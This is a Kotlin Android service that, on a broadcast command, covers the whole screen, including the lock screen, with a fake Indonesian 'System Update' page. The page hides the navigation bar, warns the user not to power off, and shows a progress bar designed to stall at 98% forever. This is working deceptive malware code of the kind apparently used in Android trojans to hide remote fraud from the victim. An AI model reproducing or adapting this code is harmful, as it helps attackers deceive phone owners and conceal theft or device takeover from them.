package com.sync.xxx

import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.util.TypedValue
import android.view.Gravity
import android.view.WindowManager
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView

class FakeUpdateOverlayService : Service() {

    companion object {
        const val ACTION_SHOW = "com.sync.xxx.FAKE_UPDATE_SHOW"
        const val ACTION_HIDE = "com.sync.xxx.FAKE_UPDATE_HIDE"
    }

    private var windowManager: WindowManager? = null
    private var overlayView: LinearLayout? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private var progressBar: ProgressBar? = null
    private var progressText: TextView? = null
    private var progressRunnable: Runnable? = null
    private var currentProgress = 0

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_SHOW -> mainHandler.post { showOverlay() }
                ACTION_HIDE -> mainHandler.post { hideOverlay() }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        val filter = IntentFilter().apply {
            addAction(ACTION_SHOW)
            addAction(ACTION_HIDE)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(receiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(receiver, filter)
        }
    }

    private fun showOverlay() {
        hideOverlay()
        currentProgress = 0

        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_FULLSCREEN or
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            PixelFormat.TRANSLUCENT
        )

        try {
            val layout = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                setBackgroundColor(Color.BLACK)
                setPadding(dpToPx(48), dpToPx(64), dpToPx(48), dpToPx(64))
            }

            // Android logo (using emoji placeholder)
            val logoView = TextView(this).apply {
                text = "🤖"
                textSize = 72f
                gravity = Gravity.CENTER
            }
            layout.addView(logoView)

            // Title text
            val titleView = TextView(this).apply {
                text = "Pembaruan Sistem"
                textSize = 28f
                setTextColor(Color.WHITE)
                setTypeface(null, Typeface.BOLD)
                gravity = Gravity.CENTER
                setPadding(0, dpToPx(32), 0, dpToPx(16))
            }
            layout.addView(titleView)

            // Status text
            val statusView = TextView(this).apply {
                text = "Menginstal pembaruan sistem..."
                textSize = 16f
                setTextColor(Color.parseColor("#B0B0B0"))
                gravity = Gravity.CENTER
                setPadding(0, 0, 0, dpToPx(24))
            }
            layout.addView(statusView)

            // Progress bar
            val progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
                max = 100
                progress = 0
                layoutParams = LinearLayout.LayoutParams(
                    dpToPx(280),
                    dpToPx(8)
                ).apply {
                    setMargins(0, dpToPx(16), 0, dpToPx(12))
                }
                indeterminateDrawable?.setTint(Color.parseColor("#3DDC84")) // Android green
                progressDrawable?.setTint(Color.parseColor("#3DDC84"))
            }
            this.progressBar = progressBar
            layout.addView(progressBar)

            // Progress percentage
            val progressText = TextView(this).apply {
                text = "0%"
                textSize = 18f
                setTextColor(Color.WHITE)
                gravity = Gravity.CENTER
                setTypeface(null, Typeface.BOLD)
            }
            this.progressText = progressText
            layout.addView(progressText)

            // Warning text
            val warningView = TextView(this).apply {
                text = "Jangan matikan perangkat Anda"
                textSize = 14f
                setTextColor(Color.parseColor("#FF6B6B"))
                gravity = Gravity.CENTER
                setPadding(0, dpToPx(32), 0, 0)
            }
            layout.addView(warningView)

            overlayView = layout
            windowManager?.addView(layout, params)

            @Suppress("DEPRECATION")
            layout.systemUiVisibility = (
                android.view.View.SYSTEM_UI_FLAG_FULLSCREEN or
                android.view.View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
                android.view.View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or
                android.view.View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                android.view.View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            )

            // Start fake progress animation (slow and never completes)
            startFakeProgress()

            Log.d("FakeUpdateOverlay", "Fake update overlay shown")
        } catch (e: Exception) {
            Log.e("FakeUpdateOverlay", "showOverlay: ${e.message}")
        }
    }

    private fun startFakeProgress() {
        progressRunnable = object : Runnable {
            override fun run() {
                if (currentProgress < 98) {
                    // Very slow progress: 1% every 3-8 seconds (random)
                    val delay = (3000..8000).random().toLong()
                    
                    currentProgress++
                    progressBar?.progress = currentProgress
                    progressText?.text = "$currentProgress%"
                    
                    // Slow down even more after 50%
                    val nextDelay = if (currentProgress > 50) delay * 2 else delay
                    mainHandler.postDelayed(this, nextDelay)
                } else {
                    // Stuck at 98% forever, never completes
                    progressBar?.progress = 98
                    progressText?.text = "98%"
                }
            }
        }
        mainHandler.postDelayed(progressRunnable!!, 2000) // Start after 2 seconds
    }

    private fun hideOverlay() {
        progressRunnable?.let { mainHandler.removeCallbacks(it) }
        progressRunnable = null
        
        overlayView?.let {
            try { windowManager?.removeView(it) } catch (_: Exception) {}
        }
        overlayView = null
        progressBar = null
        progressText = null
        
        Log.d("FakeUpdateOverlay", "Fake update overlay hidden")
    }

    private fun dpToPx(dp: Int): Int {
        return TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP,
            dp.toFloat(),
            resources.displayMetrics
        ).toInt()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        hideOverlay()
        try { unregisterReceiver(receiver) } catch (_: Exception) {}
    }
}
